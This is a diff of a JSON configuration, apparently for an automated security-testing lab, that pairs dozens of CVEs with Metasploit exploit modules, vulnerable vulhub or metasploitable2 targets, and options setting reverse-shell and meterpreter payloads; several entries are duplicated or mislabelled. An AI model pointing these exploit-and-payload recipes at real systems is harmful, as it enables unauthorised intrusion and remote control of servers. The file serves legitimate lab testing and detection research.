@@ -1,4 +1,126 @@
 [
+    {"name":"CVE-2018-11776",
+        "settings": {
+            "description":"Struts2 OGNL injection RCE",
+            "target_image":"vulhub/struts2:2.5.25",
+            "attack_src":"msf",
+            "exploit": "multi/http/struts2_multi_eval_ognl"
+        }
+    },
+    {"name":"CVE-2022-0543", 
+        "settings": { 
+            "description":"Redis Lua RCE",
+            "target_image":"vulhub/redis:5.0.7",
+            "attack_src":"msf",
+            "exploit": "exploit/linux/redis/redis_debian_sandbox_escape" 
+        }
+    },
+    {"name":"CVE-2010-2075", 
+        "settings": { 
+            "description":"UnrealIRCD backdoor command execution",
+            "target_image":"metasploitable2",
+            "attack_src":"msf",
+            "exploit": "unix/irc/unreal_ircd_3281_backdoor",
+            "exploit_options":"set PAYLOAD cmd/unix/reverse;"
+        }
+    },
+    {"name":"CVE-2007-2447", 
+        "settings": { 
+            "description":"Samba RCE",
+            "target_image":"metasploitable2",
+            "attack_src":"msf",
+            "exploit": "multi/samba/usermap_script"
+        }
+    },
+    {"name":"CVE-2005-2877", 
+        "settings": { 
+            "description":"twiki history RCE",
+            "notes":"exploit requires multiple trys for success",
+            "target_image":"metasploitable2",
+            "attack_src":"msf",
+            "exploit": "exploit/unix/webapp/twiki_history",
+            "exploit_options":"set PAYLOAD cmd/unix/python/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2007-3280", 
+        "settings": { 
+            "description":"Postgres write to /tmp RCE",
+            "target_image":"metasploitable2",
+            "attack_src":"msf",
+            "exploit": "linux/postgres/postgres_payload"
+        }
+    },
+    {"name":"CVE-2017-12149",
+        "settings": {
+            "description":"JBOSS invoker RCE",
+            "target_image":"vulhub/jboss:as-6.1.0",
+            "attack_src":"msf",
+            "exploit": "exploit/multi/misc/jboss_remoting_unified_invoker_rce"
+        }
+    },
+    {"name":"CVE-2021-3129",
+        "settings": {
+            "description":"Laravel debug RCE",
+            "target_image":"vulhub/laravel:8.4.2",
+            "attack_src":"msf",
+            "exploit": "exploit/multi/php/ignition_laravel_debug_rce"
+        }
+    },
+    {"name":"CVE-2021-42013",
+        "settings": {
+            "description":"HTTP apache normalize RCE",
+            "target_image":"cve-2021-42013",
+            "attack_src":"msf",
+            "exploit": "exploit/multi/http/apache_normalize_path_rce",
+            "exploit_options":"set RPORT 80; set SSL false;"
+        }
+    },
+    {"name":"CVE-2021-41773",
+        "settings": {
+            "description":"HTTP apache normalize RCE",
+            "target_image":"cve-2021-41773",
+            "attack_src":"msf",
+            "exploit": "exploit/multi/http/apache_normalize_path_rce",
+            "exploit_options":"set CVE CVE-2021-41773; set RPORT 80; set SSL false;"
+        }
+    },
+    {"name":"CVE-2021-25646",
+        "settings": {
+            "description":"Apache druid JS RCE",
+            "notes":"druid server takes around 90 seconds to fully load",
+            "target_image":"vulhub/apache-druid:0.20.0",
+            "attack_src":"msf",
+            "exploit": "exploit/linux/http/apache_druid_js_rce",
+            "exploit_options":"set URIPATH /druid/indexer/v1/sampler;"
+        }
+    },   
+    {"name":"CVE-2016-3088",
+        "settings": {
+            "description":"AcitiveMQ exploit CVE-2016-3088",
+            "yml_file":"$VULN_PATH/vulhub/activemq/CVE-2015-5254/docker-compose.yml",
+            "target_name":"setc-activemq-1",
+            "exploit": "multi/http/apache_activemq_upload_jsp",
+            "exploit_options":"set PAYLOAD java/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2023-46604",
+        "settings": {
+            "description":"ActiveMQ deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/activemq/CVE-2023-46604/docker-compose.yml",
+            "target_name":"setc-activemq-1",
+            "exploit": "multi/misc/apache_activemq_rce_cve_2023_46604",
+            "exploit_options":"set target 1;set PAYLOAD cmd/linux/http/x86/meterpreter_reverse_tcp;set SRVPORT 8081;"
+        }
+    },
+    {"name":"CVE-2023-25194",
+        "settings": {
+            "description":"Apache Druid JDMI injection RCE",
+            "yml_file":"$VULN_PATH/vulhub/apache-druid/CVE-2021-25646/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_druid_cve_2023_25194",
+            "exploit_options":"set target 2;set PAYLOAD cmd/unix/reverse_bash;set SRVHOST eth0;set SSL false;"
+        }
+    },
     {"name":"CVE-2020-25646",
         "settings": {
             "description":"Apisix HTTP token RCE",
@@ -8,12 +130,312 @@
             "exploit_options":"set PAYLOAD cmd/unix/reverse_bash;set RPORT 9080;"
         }
     },
-    {"name":"CVE-2018-11776",
+    {"name":"CVE-2014-6271",
         "settings": {
-            "description":"Struts2 OGNL injection RCE",
-            "target_image":"vulhub/struts2:2.5.25",
-            "attack_src":"msf",
-            "exploit": "multi/http/struts2_multi_eval_ognl"
+            "description":"Apache CGI shellshock using user agent",
+            "yml_file":"$VULN_PATH/vulhub/bash/CVE-2014-6271/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_mod_cgi_bash_env_exec",
+            "exploit_options":"set TARGETURI /victim.cgi;"
+        }
+    },
+    {"name":"CVE-2017-12636",
+        "settings": {
+            "description":"Apache CouchDB Arbitrary Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/couchdb/CVE-2017-12636/docker-compose.yml",
+            "target_name":"setc-couchdb-1",
+            "exploit": "linux/http/apache_couchdb_cmd_exec"
+        }
+    },
+    {"name":"CVE-2020-17519",
+        "settings": {
+            "description":"Apache Flink JAR Upload Java Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/flink/CVE-2020-17519/docker-compose.yml",
+            "target_name":"setc-flink-1",
+            "exploit": "multi/http/apache_flink_jar_upload_exec"
+        }
+    },
+    {"name":"CVE-2024-36401",
+        "settings": {
+            "description":"Geoserver unauthenticated Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/geoserver/CVE-2024-36401/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/geoserver_unauth_rce_cve_2024_36401"
+        }
+    },
+    {"name":"CVE-2021-22205",
+        "settings": {
+            "description":"GitLab Unauthenticated Remote ExifTool Command Injection",
+            "yml_file":"$VULN_PATH/vulhub/gitlab/CVE-2021-22205/docker-compose.yml",
+            "target_name":"setc-gitlab-1",
+            "exploit": "multi/http/gitlab_exif_rce"
+        }
+    },
+    {"name":"CVE-2017-17562",
+        "settings": {
+            "description":"GoAhead Web Server LD_PRELOAD Arbitrary Module Load",
+            "yml_file":"$VULN_PATH/vulhub/goahead/CVE-2017-17562/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/goahead_ldpreload",
+            "exoloit_options":"set target Linux x86_64;"
+        }
+    },
+     {"name":"CVE-2016-6811",
+        "settings": {
+            "description":"Hadoop YARN ResourceManager Unauthenticated Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/hadoop/unauthorized-yarn/docker-compose.yml",
+            "target_name":"setc-resourcemanager-1",
+            "exploit": "linux/http/hadoop_unauth_exec"
+        }
+    },
+    {"name":"CVE-2024-27348",
+        "settings": {
+            "description":"Apache HugeGraph Gremlin RCE",
+            "yml_file":"$VULN_PATH/vulhub/hugegraph/CVE-2024-27348/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/apache_hugegraph_gremlin_rce"
+        }
+    },
+    {"name":"CVE-2015-8562",
+        "settings": {
+            "description":"Joomla HTTP Header Unauthenticated Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/joomla/CVE-2015-8562/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/joomla_http_header_rce"
+        }
+    },
+    {"name":"CVE-2018-10933",
+        "settings": {
+            "description":"libssh Authentication Bypass",
+            "yml_file":"$VULN_PATH/vulhub/libssh/CVE-2018-10933/docker-compose.yml",
+            "target_name":"setc-sshd-1",
+            "exploit": "scanner/ssh/libssh_auth_bypass",
+            "exploit_options":"set action shell; set CMD /bin/bash"
+        }
+    },
+    {"name":"CVE-2018-10933",
+        "settings": {
+            "description":"libssh Authentication Bypass",
+            "yml_file":"$VULN_PATH/vulhub/libssh/CVE-2018-10933/docker-compose.yml",
+            "target_name":"setc-sshd-1",
+            "exploit": "scanner/ssh/libssh_auth_bypass",
+            "exploit_options":"set action shell; set CMD /bin/bash;",
+            "exploit_success_pattern":"ssh"
+        }
+    },
+    {"name":"CVE-2023-38646",
+        "settings": {
+            "description":"Metabase Setup Token RCE",
+            "yml_file":"$VULN_PATH/vulhub/metabase/CVE-2023-38646/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/metabase_setup_token_rce"
+        }
+    },
+    {"name":"CVE-2020-9496",
+        "settings": {
+            "description":"Apache OFBiz XML-RPC Java Deserialization",
+            "yml_file":"$VULN_PATH/vulhub/ofbiz/CVE-2020-9496/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/apache_ofbiz_deserialization",
+            "exploit_options": "set payload payload/linux/x86/meterpreter_reverse_tcp; set AutoCheck false;"
+        }
+    },
+    {"name":"CVE-2024-38856",
+        "settings": {
+            "description":"Apache OFBiz forgotPassword/ProgramExport RCE",
+            "yml_file":"$VULN_PATH/vulhub/ofbiz/CVE-2020-9496/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_ofbiz_forgot_password_directory_traversal",
+            "exploit_options": "set forceexploit true;"
+        }
+    },
+    {"name":"CVE-2023-32315",
+        "settings": {
+            "description":"Openfire authentication bypass with RCE plugin",
+            "yml_file":"$VULN_PATH/vulhub/openfire/CVE-2023-32315/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/openfire_auth_bypass_rce_cve_2023_32315"
+        }
+    },
+    {"name":"CVE-2020-7247",
+        "settings": {
+            "description":"OpenSMTPD MAIL FROM Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/opensmtpd/CVE-2020-7247/docker-compose.yml",
+            "target_name":"setc-smtpd-1",
+            "exploit": "unix/smtp/opensmtpd_mail_from_rce",
+            "exploit_options": "set payload cmd/unix/reverse_bash;"
+        }
+    },
+    {"name":"CVE-2024-2044",
+        "settings": {
+            "description":"pgAdmin Session Deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/pgadmin/CVE-2023-5002/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/pgadmin_session_deserialization",
+            "exploit_options": "set RPORT 5050; set SSL false; set username vulhub@example.com; set password vulhub;"
+        }
+    },
+    {"name":"CVE-2012-1823",
+        "settings": {
+            "description":"PHP CGI Argument Injection",
+            "yml_file":"$VULN_PATH/vulhub/php/CVE-2012-1823/docker-compose.yml",
+            "target_name":"setc-php-1",
+            "exploit": "multi/http/php_cgi_arg_injection"
+        }
+    },
+    {"name":"CVE-2017-9841",
+        "settings": {
+            "description":"PHP Unauthenticated OS Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/php/xdebug-rce/docker-compose.yml",
+            "target_name":"setc-xdebug2-1",
+            "exploit": "unix/http/xdebug_unauth_exec"
+        }
+    },
+    {"name":"CVE-2020-11651",
+        "settings": {
+            "description":"SaltStack Salt Master/Minion Unauthenticated RCE",
+            "yml_file":"$VULN_PATH/vulhub/saltstack/CVE-2020-11651/docker-compose.yml",
+            "target_name":"setc-saltstack-1",
+            "exploit": "linux/misc/saltstack_salt_unauth_rce",
+            "exploit_options": "set payload python/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2020-16846",
+        "settings": {
+            "description":"SaltStack Salt REST API Arbitrary Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/saltstack/CVE-2020-11651/docker-compose.yml",
+            "target_name":"setc-saltstack-1",
+            "exploit": "linux/http/saltstack_salt_api_cmd_exec",
+            "exploit_options": "set payload cmd/unix/reverse_bash;"
+        }
+    },
+    {"name":"CVE-2021-25282",
+        "settings": {
+            "description":"SaltStack Salt API Unauthenticated RCE through wheel_async client",
+            "yml_file":"$VULN_PATH/vulhub/saltstack/CVE-2020-11651/docker-compose.yml",
+            "target_name":"setc-saltstack-1",
+            "exploit": "linux/http/saltstack_salt_wheel_async_rce"
+        }
+    },
+    {"name":"CVE-2017-7494",
+        "settings": {
+            "description":"Samba is_known_pipename() Arbitrary Module Load",
+            "yml_file":"$VULN_PATH/vulhub/samba/CVE-2017-7494/docker-compose.yml",
+            "target_name":"setc-samba-1",
+            "exploit": "linux/samba/is_known_pipename",
+            "exploit_options": "set target Linux x86_64; set payload linux/x64/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2019-17558",
+        "settings": {
+            "description":"Apache Solr Remote Code Execution via Velocity Template",
+            "yml_file":"$VULN_PATH/vulhub/solr/CVE-2019-17558/docker-compose.yml",
+            "target_name":"setc-solr-1",
+            "exploit": "multi/http/solr_velocity_rce"
+        }
+    },
+    {"name":"CVE-2018-11770",
+        "settings": {
+            "description":"Apache Spark Unauthenticated Command Execution",
+            "yml_file":"$VULN_PATH/vulhub/spark/unacc/docker-compose.yml",
+            "target_name":"setc-master-1",
+            "exploit": "linux/http/spark_unauth_rce"
+        }
+    },
+    {"name":"CVE-2022-22963",
+        "settings": {
+            "description":"Spring Cloud Function SpEL Injection",
+            "yml_file":"$VULN_PATH/vulhub/spring/CVE-2022-22963/docker-compose.yml",
+            "target_name":"setc-spring-1",
+            "exploit": "linux/http/spark_unauth_rce",
+            "exploit_options":"set ForceExploit True"
+        }
+    },
+    {"name":"CVE-2022-22963",
+        "settings": {
+            "description":"Spring Cloud Function SpEL Injection",
+            "yml_file":"$VULN_PATH/vulhub/spring/CVE-2022-22963/docker-compose.yml",
+            "target_name":"setc-spring-1",
+            "exploit": "multi/http/spring_cloud_function_spel_injection",
+            "exploit_options":"set ForceExploit True;"
+        }
+    },
+    {"name":"CVE-2022-22947",
+        "settings": {
+            "description":"Spring Cloud Gateway Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/spring/CVE-2022-22947/docker-compose.yml",
+            "target_name":"setc-spring-1",
+            "exploit": "linux/http/spring_cloud_gateway_rce",
+            "exploit_options":"set RPORT 8080; set payload cmd/unix/reverse_bash; set ForceExploit true;"
+        }
+    },
+    {"name":"CVE-2017-563",
+        "settings": {
+            "description":"Apache Struts Jakarta Multipart Parser OGNL Injection",
+            "yml_file":"$VULN_PATH/vulhub/struts2/s2-046/docker-compose.yml",
+            "target_name":"setc-struts2-1",
+            "exploit": "multi/http/struts2_content_type_ognl"
+        }
+    },
+    {"name":"CVE-2016-3081",
+        "settings": {
+            "description":"Apache Struts Dynamic Method Invocation Remote Code Execution",
+            "yml_file":"$VULN_PATH/vulhub/struts2/s2-032/docker-compose.yml",
+            "target_name":"setc-struts2-1",
+            "exploit": "multi/http/struts_dmi_exec"
+        }
+    },
+    {"name":"CVE-2023-37941",
+        "settings": {
+            "description":"Apache Superset Signed Cookie RCE",
+            "yml_file":"$VULN_PATH/vulhub/superset/CVE-2023-37941/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "linux/http/apache_superset_cookie_sig_rce",
+            "exploit_options":"set username admin; set password vulhub;"
+        }
+    },
+    {"name":"CVE-2019-9082",
+        "settings": {
+            "description":"ThinkPHP Multiple PHP Injection RCE",
+            "yml_file":"$VULN_PATH/vulhub/thinkphp/5-rce/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "unix/webapp/thinkphp_rce",
+            "exploit_options":"set rport 80;"
+        }
+    },
+    {"name":"CVE-2019-9082",
+        "settings": {
+            "description":"ThinkPHP Multiple PHP Injection RCE - TODO: doesnt work for some reason",
+            "yml_file":"$VULN_PATH/vulhub/thinkphp/5-rce/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "unix/webapp/thinkphp_rce",
+            "exploit_options":"set RPORT 80;"
+        }
+    },
+    {"name":"CVE-2023-21839",
+        "settings": {
+            "description":"Oracle Weblogic PreAuth Remote Command Execution via ForeignOpaqueReference IIOP Deserialization",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2023-21839/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/iiop/cve_2023_21839_weblogic_rce",
+            "exploit_options":"set HTTP_SRVPORT 7001; set RPORT 7001; set SRVHOST eth0; set AutoCheck false;"
+        }
+    },
+    {"name":"CVE-2020-14882",
+        "settings": {
+            "description":"Oracle WebLogic Server Administration Console Handle RCE",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2020-14882/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/http/weblogic_admin_handle_rce",
+            "exploit_options":"set target Linux Dropper; set payload linux/x86/meterpreter/reverse_tcp;"
+        }
+    },
+    {"name":"CVE-2019-2725",
+        "settings": {
+            "description":"Oracle Weblogic Server Deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/weblogic/CVE-2018-2628/docker-compose.yml",
+            "target_name":"setc-weblogic-1",
+            "exploit": "multi/misc/weblogic_deserialize_asyncresponseservice"
         }
     }
 ]
